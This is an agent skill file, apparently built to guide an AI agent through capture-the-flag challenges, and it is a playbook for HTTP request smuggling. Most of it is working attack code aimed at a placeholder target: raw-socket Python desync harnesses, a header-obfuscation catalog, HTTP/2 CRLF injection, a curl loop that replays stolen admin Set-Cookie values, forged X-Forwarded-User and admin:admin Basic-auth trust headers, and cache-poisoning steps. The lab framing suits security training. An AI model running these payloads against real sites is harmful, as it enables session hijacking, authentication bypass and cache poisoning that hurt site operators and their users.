---
name: smuggling
description: "HTTP Request Smuggling (HRS) — front-end / back-end parser disagreement attacks that desync the proxy stack. Covers CL.TE, TE.CL, TE.TE, CL.0, HTTP/2 downgrade (h2.cl, h2.te), pipelining, and connection-state pinning. Includes a confirm-desync gate, header obfuscation catalog, and minimal raw-socket Python harnesses (no smuggler.py available in sandbox)."
metadata:
  mitre_attack: T1190
  when_to_use: "HTTP request smuggling, HRS, request smuggling, desync, CL.TE, TE.CL, TE.TE, h2.cl, h2.te, HTTP/2 downgrade, HTTP downgrade, h2c smuggling, pipelining, header folding, content-length transfer-encoding mismatch, frontend backend disagreement, multi-proxy stack, CDN frontend, reverse proxy, smuggling_desync challenge tag, hrs"
---

# HTTP Request Smuggling (Desync)

Exploits parser disagreement between two HTTP intermediaries on the same connection (front-end CDN/proxy ↔ back-end origin). When one side ends a request at byte X and the other at byte Y, the bytes between X and Y are the "smuggled" prefix of the next victim request — letting the attacker rewrite the next user's request, steal cookies/headers, or hit auth-bypassed routes.

## When This Skill Is Primary

HRS bypasses authentication and authorization at the front-end/back-end boundary — it does NOT need correct credentials. **When `smuggling_desync` (or `request_smuggling` / `hrs` / `desync`) co-occurs with credential-related tags (`default_credentials`, `jwt`, `weak_password`), smuggling IS the primary attack vector.** Credential brute-force is a fallback only after the confirm-desync gate (below) fires NEGATIVE.

Reasoning: a CTF that ships both tags is signaling "you have a low-priv account (`test:test`, etc.) — use it as your session anchor and bypass the role check via parser disagreement." Burning the time budget on `admin:*` brute-force misses the design entirely. Use the low-priv credentials as the OUTER request session; smuggle the privileged INNER request.

The same logic applies when `smuggling_desync` co-occurs with `cve` (the CVE is likely the desync primitive; e.g., CVE-2022-24766 is mitmproxy h1 smuggling — see Variant Catalog → CL.0 / pause-based desync below).

## Recognition Signals

Trigger this skill when ANY of the following are present:

- **Multi-proxy stack visible**: two `Server:` strings across responses (e.g. `cloudflare` then `gunicorn`); `Via:` header present; CDN/edge fingerprint (Cloudflare CF-RAY, AWS CloudFront, Akamai, Fastly).
- **Differential 400/501** when sending duplicate/obfuscated `Transfer-Encoding` or `Content-Length` headers (one path 200, another 400/501).
- **HTTP/2 frontend** with HTTP/1.1 backend (`alt-svc: h2`, `:status` pseudo-header, `HTTP/2` ALPN). Downgrades are the modern smuggling surface.
- **Pipelining differences**: connection reused across requests with inconsistent framing.
- **Challenge tag** includes `smuggling_desync`, `request_smuggling`, `hrs`, `desync`, or recon's "Frontend behavior" line says "frontend forwards malformed framing".
- **Recon handoff** notes that the same payload yields different status codes when sent to different proxy hops or with different framing.

## Confirm-Desync Gate

**STOP**. Before iterating ANY payload, prove a real desync exists. Differential parsing alone (different status codes from different headers) is NOT a smuggle — it is a hint. The gate is a single in-file Python probe that opens one TCP connection and pipelines two requests where the second is detectable only if the first leaked bytes into the connection buffer.

```bash
timeout 60 python3 -u -c '
import socket, sys

HOST, PORT = "<TARGET>", 443  # use 80 for plain HTTP
USE_TLS = (PORT == 443)

# CL.TE smuggling probe — front-end uses Content-Length, back-end uses Transfer-Encoding.
# A real desync makes the back-end park "X" as the start of the NEXT request on this socket.
smuggle = (
    "POST / HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "X"  # the smuggled prefix
)
victim = (
    "GET / HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "\r\n"
)

s = socket.create_connection((HOST, PORT), timeout=5)
if USE_TLS:
    import ssl
    s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
s.settimeout(5)
s.sendall(smuggle.encode() + victim.encode())

buf = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
        if len(buf) > 16384:
            break
except socket.timeout:
    pass
finally:
    s.close()

# Desync signal: victim request fails with 400/405 because "XGET" landed at backend.
# Baseline GET / on the same target returns 200 — so 400/405 here is the smoke.
sys.stdout.write(buf[:2048].decode(errors="replace"))
sys.stdout.flush()
' 2>&1 | tee smuggle_gate.txt
```

**Pass criteria** (any one):
- Second response shows `400 Bad Request` containing `XGET` / `Invalid method` / `bad request line`.
- Connection closes after the first response with the second never sent (back-end ate the smuggled bytes).
- Repeating the same probe on a fresh connection still 200s — i.e. the desync is connection-scoped.

If gate FAILS (no pass criteria met before the harness's outer `timeout` fires): do NOT iterate variants. Hand back to recon with "no desync confirmed despite differential parsing — multi-proxy stack may not exist on this path".

If gate PASSES: continue to the variant catalog with the same connection-pinning style.

## Variant Catalog

Each variant is a single in-file Python harness. Always:
- `sock.settimeout(<bounded>)` BEFORE `connect` AND before each `recv`.
- Outer wall: `timeout <bounded> python3 -u -c '...'` (the gate may need a longer wall than per-variant iteration).
- `python3 -u` for line-buffered stdout (or `sys.stdout.flush()`).
- Bounded `recv` loop (max ~16 KB or break on empty).
- ONE socket per variant; close it in `finally`.

### CL.TE (front=CL, back=TE)

Front-end honors `Content-Length`, back-end honors `Transfer-Encoding: chunked`. Smuggle the prefix in the chunked body's terminating `0\r\n\r\n` overflow.

```python
# timeout 30 python3 -u -c '...'
import socket, ssl
HOST, PORT, USE_TLS = "<TARGET>", 443, True
req = (
    "POST / HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "Content-Length: 13\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GPOST / HTTP/1.1\r\n"
)
s = socket.create_connection((HOST, PORT), timeout=5)
if USE_TLS:
    s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
s.settimeout(5)
s.sendall(req.encode())
print(s.recv(4096).decode(errors="replace"))
s.close()
```

### TE.CL (front=TE, back=CL)

Front-end uses chunked, back-end uses `Content-Length`. The chunked size declaration smuggles past the back-end's CL boundary.

```python
body_smuggled = "GET /admin HTTP/1.1\r\nHost: <TARGET>\r\n\r\n"
chunk_size = format(len(body_smuggled), "x")
req = (
    "POST / HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    f"Content-Length: {len(chunk_size) + 2 + 2}\r\n"  # only the chunk-size line + CRLF + 0\r\n
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    f"{chunk_size}\r\n"
    f"{body_smuggled}"
    "0\r\n"
    "\r\n"
)
```

### TE.TE — Header Obfuscation Catalog

Both proxies process `Transfer-Encoding`, but only one is fooled by an obfuscated header. Send TWO `TE` headers; if one parser accepts one and rejects the other, you get desync.

| Obfuscation | Example header line |
|-------------|--------------------|
| Duplicate header | `Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked` |
| Space prefix | ` Transfer-Encoding: chunked` (leading SP) |
| Tab prefix | `\tTransfer-Encoding: chunked` |
| Mixed case | `Transfer-encoding: ChUnKeD` |
| Trailing whitespace | `Transfer-Encoding : chunked` (SP before colon) |
| Header folding (obsolete) | `Transfer-Encoding:\r\n chunked` (continuation line) |
| Bogus value + valid | `Transfer-Encoding: cow\r\nTransfer-Encoding: chunked` |
| Vertical tab | `Transfer-Encoding:\x0bchunked` |

```python
# Example: duplicate-header TE.TE
req = (
    "POST / HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Transfer-Encoding: cow\r\n"   # second TE confuses one of the two parsers
    "\r\n"
    "5c\r\nGPOST / HTTP/1.1\r\nHost: <TARGET>\r\n\r\n"
    "0\r\n\r\n"
)
```

### CL.0

Back-end ignores `Content-Length` on certain methods/paths (treats them as `CL: 0`). Front-end forwards the body, back-end parses it as the next request. Common against static-asset paths or `OPTIONS` handlers.

```python
req = (
    "POST /static/foo.css HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "Content-Length: 38\r\n"
    "\r\n"
    "GET /admin HTTP/1.1\r\nHost: <TARGET>\r\n\r\n"
)
```

### HTTP/2 Downgrade (h2.cl, h2.te)

Front-end speaks HTTP/2, back-end speaks HTTP/1.1. The h2→h1 downgrader translates pseudo-headers and may forward `:method`, `:path`, and arbitrary header bytes (including CR/LF) into a back-end request line. Two flavors:

- **h2.cl** — h2 request carries an explicit `content-length` longer/shorter than the data frame; downgrader forwards the declared CL, back-end mis-frames.
- **h2.te** — h2 request carries `transfer-encoding: chunked`; some downgraders forward the header verbatim, the back-end then chunks while the front-end already CL-framed.

Use a real h2 client (`hyper`, `h2`, `httpx[http2]`) — raw sockets are too painful here. Keep the same timeout discipline.

```python
# pip install httpx h2
import httpx
client = httpx.Client(http2=True, timeout=5.0, verify=True)

# h2.te smuggle attempt
r = client.post(
    "https://<TARGET>/",
    headers={"transfer-encoding": "chunked"},
    content=b"0\r\n\r\nSMUGGLED PREFIX",
)
print(r.status_code, r.headers.get("server"), r.text[:300])
```

### CR/LF Injection in HTTP/2 Pseudo-Headers

If the downgrader does not strip CR/LF inside `:path` or other pseudo-header values, you can inject a full second request:

```python
r = client.get(
    "https://<TARGET>/",
    headers={":path": "/x\r\nHost: evil\r\n\r\nGET /admin HTTP/1.1\r\nHost: <TARGET>\r\n\r\n"},
)
```

Most h2 client libraries refuse to send CR/LF in pseudo-headers — you may need to monkeypatch the validator or drop to a low-level frame builder (`hyperframe`).

### Pipelining

When a connection is keep-alive and the front-end forwards multiple requests on it, classic CL/TE confusion smuggles the SECOND request on the wire. The gate above is already a pipelining probe.

### Connection-State Pinning

Some intermediaries pin the (frontend → backend) socket per first-Host-header. Smuggling a `Host: internal` prefix can rewrite which back-end vhost subsequent victim requests reach. Test by smuggling `Host: admin.<target>` and checking whether subsequent baseline requests now route there.

### Triple-tier (3+ proxy) desync matrix

Production stacks rarely have just front/back. Typical chains: `CDN → WAF → LB → origin`, `MITM/observability proxy → reverse-proxy → app-server → app`, `cloud LB → ingress → service mesh → pod`. With N proxies in series there are N-1 hop boundaries, and **every hop boundary is a potential desync point** with its own parser-pair semantics. A payload that "doesn't work" on the outermost pair may smuggle perfectly across an inner pair.

**Enumerate the chain first.** Tier identification is recon: response headers (`Via:`, `Server:`, `X-Forwarded-*`, `X-Cache:`, `X-Proxy-*`, repeated/duplicated values), behavioral fingerprints (which tier returns 4xx on which malformed input), timing (each hop adds latency), and source-disclosure paths in the engagement. Map the chain top-down before crafting payloads:

| Step | Probe | What you learn |
|------|-------|----------------|
| 1 | `curl -sv <TARGET>/` 2>&1 \| grep -iE '^(server\|via\|x-)' | First-line tier (front-most CDN/WAF/MITM banner) |
| 2 | Send a known-bad path → which tier 4xx's | Each tier's error fingerprint (HTML template, 4xx code shape) |
| 3 | Send oversized header → which tier truncates / 431s | Buffer limits per tier (helps frame payload size) |
| 4 | Send malformed TE / duplicate-CL → which tier errors WITH WHICH BODY | Reveals the parser strictness of EACH tier independently |
| 5 | Send `OPTIONS *` → who answers | Reveals the back-most tier that responds, vs intermediates that proxy |

Once you have N tiers, enumerate the N-1 desync targets:

```
T1 → T2 → T3 → T4 (origin)
^^^^^^^^   = pair AB: CL.TE / TE.CL / TE.TE matrix
     ^^^^^^^^   = pair BC: same matrix, different parsers
          ^^^^^^^^   = pair CD: same matrix, often differs again
```

**Probing each hop-boundary** — the same per-variant Python harness works, but you target a specific pair by exploiting that pair's parser asymmetry. Practical guidance:

1. **Start with the back-most pair you can prove was reached** (e.g. pair CD origin-adjacent). If you can smuggle to origin, you bypass every tier above without needing front-pair desync. Probe: smuggle a request whose response body is *visibly different from what the outer tiers would emit* (an internal vhost banner, an internal-only path served by origin). If the smuggled response surfaces, that pair desyncs.

2. **If origin-adjacent pair is locked** (modern app servers like nginx + apache often refuse CL+TE outright), walk OUTWARD one pair at a time. Each pair retains its own parser quirks regardless of upstream/downstream rigor — a strict origin can sit behind a tolerant MITM tier that desyncs the LB↔app boundary.

3. **Probe-pair-isolation trick**: send the same payload over a fresh TCP connection vs an existing keep-alive connection. If the keep-alive run yields a different response on the *second* request, the desync poisoned the back-end socket — that confirms an inner pair desyncs (the outer pair faithfully forwarded). New TCP shows the OUTER pair's behavior; reused connection shows the INNER pair behavior.

4. **`Via` header inversion**: if responses contain `Via: <tier-A>, <tier-B>` (typical of CDN+LB), smuggling that successfully bypasses tier-A will produce responses with `Via: <tier-B>` only (because tier-A never saw the smuggled inner request). Use the SHAPE of the `Via:` chain on a smuggled response vs a baseline response to confirm which pair was crossed.

5. **Triple-tier `Host` smuggle** (the common-stack admin-vhost win): when the chain is `MITM → LB(host-routing) → origin(vhost)` and LB chooses backend by `Host:` header, smuggling a fresh `Host: internal-admin.<target>` line in the inner request makes the LB route to an internal vhost the outer client could never reach. The two desync pairs you can use:
   - **Outer-pair desync** (MITM↔LB): inject the inner request past MITM so LB sees a new request with the attacker's `Host:`. Pair AB matrix from above.
   - **Inner-pair desync** (LB↔origin): keep MITM and LB in sync but desync at LB↔origin so origin processes a smuggled request with a different `Host:` than LB used for routing. Less common; signature is "LB-side ACL passed but origin served a different vhost's content."

**Anti-pattern**: assuming the chain is 2-tier and iterating CL.TE / TE.CL endlessly against the outer pair when the desync surface is actually 2 hops inward. If 8+ outer-pair variants produce no response divergence, the outer pair is rigid — STOP and shift focus inward via the probe ladder above.

**Generality**: applies whenever you can identify ≥3 hops via `Via`/`Server`/`X-*` chain inspection. The matrix scales: a 4-tier stack has 3 desync targets, a 5-tier stack has 4. The cost per additional pair to probe is small (one round of the CL.TE/TE.CL/TE.TE matrix) — far cheaper than iterating one pair indefinitely.

## Tooling Note

`smuggler.py` (defparam/smuggler) is **NOT installed** in the sandbox. Do not invoke it. Write the in-file Python harnesses above instead. `httpx[http2]` is available for h2 work.

## Anti-Patterns (Do NOT)

- **No `python3 detector.py > out.txt 2>&1` without `&` AND inner `socket.settimeout(<bounded>)`** — bash without timeout + missing socket timeout = guaranteed wedge.
- **No bash `&` to background long detectors** — backgrounded jobs detach from the tool's stdout/timeout, you cannot tell whether they wedged or finished.
- **Use `timeout <bounded> python3 -u -c '...'`** for any raw-socket harness. Outer wall is mandatory even when inner socket timeouts are set.
- **Do not iterate variants before the confirm-desync gate fires positive.** Iterating without confirmation burns the entire dispatch on payloads that cannot work.
- **Kill detectors when no observable progress is being produced.** A live desync confirms in a small number of round-trips; if the gate did not fire after the configured budget, the path is not smuggleable.
- **Do not use unbounded `recv()` loops** — break on empty bytes OR `>16 KB` accumulated, whichever is first.
- **Do not write `python3 -c "..."` without `-u`** when you want streaming logs.

## Class A vs Class B — Routing Decision Tree

After confirm-desync gate fires positive, smuggling exploits split into two classes by the source of privileged bytes:

| Class | Source of admin bytes | Detection probe (run FIRST) | Win pattern |
|-------|----------------------|----------------------------|-------------|
| **A** — Response queue poisoning (admin-bot) | Concurrent admin user/bot browsing the target | 5× smuggle `GET /admin*` over 30s. If ANY response carries an admin-context `Set-Cookie:` or admin HTML body → **Class A** | Capture admin Set-Cookie, replay with `curl -b`. See "Class A — Response Queue Poisoning" below. |
| **B** — No-bot (header trust / cache poisoning / inherited auth) | Outer request's own auth state, OR back-end's trust of front-end-injected headers, OR shared cache | After 5× probes return only public/login content → **Class B**. Stop polling for an admin bot. | Manipulate the smuggled inner request's headers/path so the back-end treats it as privileged. See "Class B" below. |

**Class B is the more common pattern in CTF design** because it is deterministic — it does not require a concurrent admin browsing session. If `poll_admin.py` (or any `/admin` poll loop) returns no admin Set-Cookie across a small batch of probes, **STOP polling and pivot to Class B**. Continuing to poll for an admin bot that never arrives is the canonical mis-allocation in this attack class.

## Class A — Response Queue Poisoning (admin-bot)

(Formerly "Session Hijack via Response Queue Poisoning" — same chapter, retitled to fit Class A/B routing.)

> **ANTI-PATTERN: DO NOT brute-force admin credentials when this tag is present.** When smuggling and a credentials-related tag co-occur, the design intent is "use the smuggle as the auth bypass", not "guess the admin password". An admin-context `Set-Cookie:` returned on a smuggled `/admin*` request IS the win — it is easy to miss because it looks like nothing more than a 200 with a session cookie. Brute-force is a fallback ONLY after the confirm-desync gate has fired NEGATIVE. The PRIMARY path is: smuggle → capture `Set-Cookie:` → `curl -b "<cookie>" $TARGET/admin_panel` → grep flag.

**Trigger:** confirm-desync gate has fired positive (a real desync exists), AND your smuggled `GET /admin_panel` (or any auth-required path) came back `200 OK` with a NEW `Set-Cookie: session=...`. **That cookie is admin-context.** The backend processed the smuggled request as a privileged user (or as no-user), the response was queued, and the next response on the connection landed YOUR cookies on a different request — but the response your client sees may include the admin Set-Cookie that the backend issued for the smuggled prefix.

This pattern is more common than reflected `/echo` cookie theft. It looks like nothing — just a 200 with a session cookie — which is exactly why agents miss it and pivot to brute-force instead.

### Detection: every smuggle response with Set-Cookie is a candidate

```bash
# After confirm-desync gate fires positive, capture EVERY response header on smuggled requests:
timeout 30 python3 -u -c '
import socket, ssl, sys, re
HOST, PORT = "<TARGET>", 80
smuggle = (
    "POST / HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "Content-Length: 70\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin_panel HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "X-Ignore: XX"
)
victim = "GET / HTTP/1.1\r\nHost: <TARGET>\r\n\r\n"
s = socket.create_connection((HOST, PORT), timeout=5); s.settimeout(5)
s.sendall(smuggle.encode() + victim.encode())
buf = b""
try:
    while True:
        c = s.recv(4096)
        if not c or len(buf) > 32768: break
        buf += c
except socket.timeout: pass
finally: s.close()
sys.stdout.write(buf.decode(errors="replace"))
' 2>&1 | tee smuggle_admin_setcookie.txt

# Extract every Set-Cookie value:
grep -i "^Set-Cookie:" smuggle_admin_setcookie.txt
```

### Exploitation: replay each captured Set-Cookie against the protected endpoint

```bash
# For each Set-Cookie value extracted above, try it against the target:
for cookie in $(grep -i "^Set-Cookie:" smuggle_admin_setcookie.txt | sed 's/Set-Cookie: //;s/;.*//'); do
    echo "=== Trying $cookie ==="
    curl -s -b "$cookie" "$TARGET/admin_panel" | grep -E "FLAG\{|admin|<title>" | head -5
    curl -s -b "$cookie" "$TARGET/flag" 2>/dev/null
done
```

### Win condition

A smuggled `Set-Cookie` that, when replayed via `curl -b`, gives you a different page than the unauthenticated baseline (e.g. admin dashboard instead of login redirect, or the flag itself) IS the exploit. **Repro the smuggle three times** to rule out coincidence (per the verification rule above) — if the same admin Set-Cookie comes back across multiple smuggle attempts, it is reliably exploitable.

### Why this beats brute-force on `default_credentials + smuggling_desync` challenges

When BOTH tags appear, the challenge is almost never "brute-force the admin password". Default-credentials is a hint that ONE low-priv account exists (`test:test` here) — it gives you a session to compare against the smuggled session. Smuggling is the actual privilege-escalation primitive. Burning the time budget on `admin:*` brute-force misses the design entirely. **Default rule: if `smuggling_desync` is present, the parser-disagreement attack IS the primary path; credentials brute-force is at most a 5-minute fallback after the smuggling gate has fired NEGATIVE.**

## Class B — No-Bot Smuggling Patterns

When there is no admin user browsing concurrently, the privileged bytes must come from one of three sources. Try each in order; each is a 5-minute time-box.

### B1 — Outer-Request Cookie/Header Inheritance

The simplest attack when you already have a low-priv session (e.g. `test:test` from `default_credentials`). Send the smuggle on a connection that ALSO sends the outer request with your low-priv cookie. The back-end may concatenate connection state — your session cookie attaches to the smuggled inner request, and the back-end treats the inner `GET /admin_panel` as if it came from your authenticated session. Effective when the role check is on a header the front-end injects (`X-User`, `X-Forwarded-User`) rather than the cookie value.

```python
# Outer request carries your low-priv session; smuggled inner inherits it
smuggle = (
    "POST / HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "Cookie: session=<YOUR_TEST_SESSION>\r\n"   # outer auth
    "Content-Length: 80\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n\r\n"
    "GET /admin_panel HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "Cookie: session=<YOUR_TEST_SESSION>\r\n"   # repeat inside the inner — may be picked up
    "X-Ignore: X"
)
# Send + read 2 responses (outer 405/200 + inner)
```

### B2 — Front-End Trust Header Injection (the most common Class B win)

Many proxies (mitmproxy, nginx, Apache, HAProxy) strip client-supplied `X-Forwarded-*` / `X-User` / `X-Remote-User` / `X-Real-IP` headers and re-inject their own. The back-end then TRUSTS those headers as authoritative. If you can smuggle an inner request that bypasses the strip (because the front-end already forwarded the outer) and the back-end reads them, you become whoever you claim.

```python
# Smuggle an inner request with explicit trust headers — front-end never sees them, back-end honors them
smuggle = (
    "POST / HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "Content-Length: 130\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n\r\n"
    "GET /admin_panel HTTP/1.1\r\n"
    "Host: <TARGET>\r\n"
    "X-Forwarded-User: admin\r\n"
    "X-Remote-User: admin\r\n"
    "X-Forwarded-For: 127.0.0.1\r\n"
    "X-Real-IP: 127.0.0.1\r\n"
    "X-User: admin\r\n"
    "Authorization: Basic YWRtaW46YWRtaW4=\r\n"   # admin:admin (Basic auth — back-end may accept)
    "X-Ignore: X"
)
# Read ≥2 responses; second response body should contain admin content if any header is trusted
```

The challenge designer's intent is usually one specific header. Try the catalog above in batches of 3 per smuggle attempt to keep the inner request small enough that CL framing still works. If `Authorization:` flips the response, the back-end re-validates Basic auth and your inner is bypassing the front-end's session-only check.

### B3 — Cache Poisoning via Smuggled Admin Response

Front-end has a shared response cache keyed by URL+headers. Smuggle an inner request whose response (if it were authenticated as admin) would be served — get the cache to store the admin response under a public URL key. Then any unauthenticated client visiting the public URL gets the cached admin response.

```python
# Step 1: smuggle an inner GET /admin_panel with a Cache-Control hint
# Step 2: from a different connection, GET / (or the public path the cache keys on)
# If the public response now contains admin HTML — cache poisoning won, the flag is in the cached body
```

Detection signal: after smuggle, hit a normally-public path (e.g. `/`, `/login`, `/static/index.html`) WITHOUT a session cookie. If response size or content is anomalous (e.g. has an admin nav bar, a session cookie, or admin-only HTML), the cache was poisoned.

### Class B verification

For Classes B1/B2/B3, the success signal is: **the back-end response body for `/admin_panel` (or whatever the protected path is) is returned to YOU on the same connection where you sent the outer POST**, with admin-only content (admin nav, user list, settings page, the flag itself). Reading the SECOND response on the smuggle socket is critical — the FIRST response is the outer POST's 405/200 from the front-end; the SECOND is the back-end's response to the smuggled inner.

```python
# Read both responses — capture both
buf = b""
responses_seen = 0
try:
    while responses_seen < 2:
        c = s.recv(4096)
        if not c: break
        buf += c
        # naive double-response detection: count "HTTP/1.1 " occurrences
        responses_seen = buf.count(b"HTTP/1.")
        if len(buf) > 32768: break
except socket.timeout: pass
# split on "HTTP/1." boundary; index 1 is the inner-request response; check for "admin", "FLAG{", or unique admin-page strings
```

## Class C — Reflected Internal Diagnostics / Response-Desync Pivot

A separate pattern from Class A (admin-cookie theft) and Class B (no-bot
hijack): the application exposes an **authenticated diagnostic / settings
endpoint that itself performs an internal HTTP request through the proxy
stack and reflects the verbose backend response back to the caller**.
The win is not to steal admin — it is to make that internal diagnostic
request reach a privileged internal route (status, debug, internal API,
flag service) and to read the flag out of the reflected response.

This shows up wherever a frontend exposes "test the upstream" / "fetch
status" / "settings preview" features, including router admin panels,
service-mesh dashboards, internal CI/observability UIs, and any
microservice that proxies a backend on behalf of the user.

**Recognition signals (any 2+):**

- Authenticated request triggers a backend fetch the response body or an
  error modal echoes verbose (`-v`-style) — headers, body, target host,
  status line.
- Echoed output names internal vhosts/services not exposed externally
  (`Via:`, `X-Forwarded-Host`, `Server:`, internal hostnames).
- Network-visible enumeration suggests internal status/debug/flag routes
  on the proxied backend (status pages, health endpoints, debug
  consoles, internal admin APIs).
- The challenge ships a low-privilege account and a settings/diagnostic
  page rather than (or alongside) a classic admin login.
- `smuggling_desync` co-occurs with credentials/auth-bypass tags pointing
  at the proxied backend rather than the public frontend.

**Deterministic workflow (time-box ~8 minutes):**

1. Authenticate with whichever low-privilege account the challenge
   exposes; save the cookie.
2. Hit the diagnostic/settings endpoint once with that cookie and capture
   the reflected response. Confirm: which internal host/vhost is being
   contacted, what baseline path/headers are in use, what is being
   echoed back.
3. From the reflected output and any other network-visible clues
   (page comments, JS, `robots.txt`, error text, enumerable status
   endpoints), assemble a small candidate list of internal routes worth
   pivoting to (status / health / debug / internal admin / direct
   flag-fetch endpoints). Do **not** hardcode a single guess.
4. Send bounded raw-socket smuggle variants targeting the diagnostic
   request path/response, not the public admin page. Hard wall every
   harness: `timeout 30`, `sock.settimeout(5)`, bounded `recv` loop.
   Success signal: `FLAG{...}` (or unique privileged content) appearing
   in the **reflected diagnostic output** or in the second response on
   the same socket.
5. If three bounded variants do not reach an internal route, write the
   evidence and pivot back to Class A or B. Do not brute-force admin for
   more than the budget in `exploit/workflow.md`.

**Critical: identify the attack-surface layer BEFORE picking a primitive.**

A diagnostic-reflection HRS has TWO connection paths and they require
DIFFERENT primitives. Choosing the wrong one wastes the engagement:

| Layer | Connection | Attack primitive | When it applies |
|---|---|---|---|
| **External TCP** | Client → frontend proxy (mitmproxy/HAProxy) → external Apache | CL.TE / TE.CL desync from the agent's own socket | The external proxy stack itself has a CL/TE disagreement and the smuggled prefix lands at the external Apache vhost. **Will NOT reach an internal-only vhost.** |
| **Server-side subprocess** | The diagnostic handler runs `curl` / `file_get_contents` / `requests.get(...)` from inside the application to a backend (`Host: internal.xyz`). | Manipulate the URL or headers of THAT outbound call: SSRF parameter injection, CRLF injection into the URL, http-reuse connection-pool poisoning on the backend port the subprocess hits. | The flag lives on a vhost the SERVER-SIDE curl can reach (because the app already targets it with the right Host header) but the EXTERNAL connection cannot (different vhost routing, IP allowlist, internal-only port). |

Diagnose the layer by reading the reflected output: if the diagnostic
modal shows `* Trying 172.x.y.z:<port>` followed by `> GET /<path> HTTP/1.1`
and `> Host: <internal_vhost>`, the **server-side subprocess** is doing
the work. An external socket smuggle that goes through the front-end
proxy CANNOT reach that internal vhost — front-end routing sends the
agent's socket to the public vhost, where the smuggled prefix lands
on the wrong server. Confirmation signal: the agent's smuggle returns
the front-end's 404/405/index-page body, NOT the internal Flask /Apache
response shape.

When the layer is server-side subprocess, the primitive shifts from
"socket-level CL.TE" to "manipulate the subprocess request":

1. **Direct URL parameter** — does the diagnostic endpoint accept any
   POST/GET field that flows into the subprocess URL? Try path-traversal,
   query-string injection, absolute-URL replacement on every field.
2. **CRLF in URL** — if the subprocess passes user input through
   `Host:` or path construction without sanitization, `%0d%0aHost:
   internal.target%0d%0a` rewrites the outbound request line.
3. **Connection-pool poisoning** — when the backend proxy has
   `http-reuse always` (HAProxy) or HTTP/1.1 keep-alive, send a prior
   request that leaves a poisoned framing in the pool; the subsequent
   subprocess curl reuses that connection and consumes your smuggled
   prefix.
4. **Backend-vhost direct hit** — if you can reach the backend port
   directly (Docker port mapping, allowlisted IP), bypass the subprocess
   entirely and call the internal vhost with the right `Host` header.

The sibling-resource enumeration below applies to BOTH layers, but
must be run against the layer the flag actually lives on. Confirm the
layer FIRST.

**Diagnostic baseline (placeholder identifiers):**

```bash
TARGET="http://<target>"
LOW_USER="<discovered_default_user>"; LOW_PASS="<discovered_default_pass>"
DIAG_ENDPOINT="<authenticated_diagnostic_path>"

curl -s -i -c cookies.txt -d "username=$LOW_USER&password=$LOW_PASS" "$TARGET/<login_path>" | tee login.txt
curl -s -i -b cookies.txt -X POST "$TARGET$DIAG_ENDPOINT" | tee diagnostic_baseline.html
grep -Ei "Via:|X-Forwarded-|Server:|<internal_vhost_hint>|FLAG\\{" diagnostic_baseline.html | head -80
```

**Route-priority heuristic for diagnostic-reflection HRS:**

When network enumeration or reflected diagnostics reveal a structured
internal namespace (status pages keyed by name, internal device/service
registries, internal admin APIs distinct from the public admin UI), the
flag is more often inside that internal namespace than behind the
public admin login. Treat the public admin page as a possible decoy and
prioritize internal/back-end routes that the proxy is willing to fetch
on the user's behalf.

**Sibling-resource enumeration in the observed URL pattern (MANDATORY):**

When the reflected server-side request hits a URL like `/devices/<name>/status`,
`/services/<key>/state`, `/projects/<id>/manifest` — the **URL template** is the
attack surface, not just the one resource the application already fetches. Two
common failure modes for agents:

1. Trying only the observed path verbatim (e.g. `/devices/wifi_chipset/status`).
2. Trying generic sibling NAMES at a different depth (e.g. `/devices/flag` —
   missing the trailing `/status` segment).

**The rule**: substitute every entity name visible in the internal namespace
listing (or any synonym list like `flag`, `admin`, `secret`, `debug`, `internal`,
`backup`, `root`, `system`, `private`, `prod`, `staging`) into the SAME
template — preserving every path segment, not just the variable one. The
internal app's router typically registers routes at the deeper path, not the
prefix, so partial paths return 404 while the full template returns the
sensitive resource.

```bash
# Observed server-side request URL template (from diagnostic reflection)
URL_TEMPLATE='/devices/{NAME}/status'

# Entity names: from the internal namespace listing + canonical sensitive synonyms
NAMES=(wifi_chipset flag admin secret debug backup internal private system root prod)

# Smuggle each variant — the response that differs from the others is the win
for name in "${NAMES[@]}"; do
  path="${URL_TEMPLATE//\{NAME\}/$name}"
  # ... build the smuggle payload targeting Host: internal.<vhost> + $path
  echo "Smuggle target: $path"
done
```

**Anti-pattern**: testing `/devices/flag` and concluding the resource is absent
when `/devices/flag/status` would have returned the flag. The internal app's
URL pattern is what the agent must preserve — recon's job is to extract the
template; exploit's job is to enumerate every name slot in it.

**Output files:**

```
./
├── diagnostic_baseline.html
├── diagnostic_desync_<variant>.txt
└── diagnostic_summary.md
```

## PortSwigger Lab Pattern Reference

PortSwigger's HRS labs follow a stable shape — recognize them so you don't reinvent the variant table:

- **Lab: HTTP request smuggling, basic CL.TE / TE.CL** — direct gate variants above.
- **Lab: TE.TE obfuscating the TE header** — duplicate-header obfuscation (catalog row 1).
- **Lab: HTTP/2 request smuggling via CRLF injection** — `:path` / arbitrary pseudo-header CR/LF.
- **Lab: HTTP/2 request smuggling via h2.cl / h2.te** — downgrade variants.
- **Lab: client-side desync** — front-end honors body framing the browser sets up (`fetch` with `Content-Length`).
- **Lab: server-side pause-based desync** — slow-write the smuggled body so the back-end times out partway.

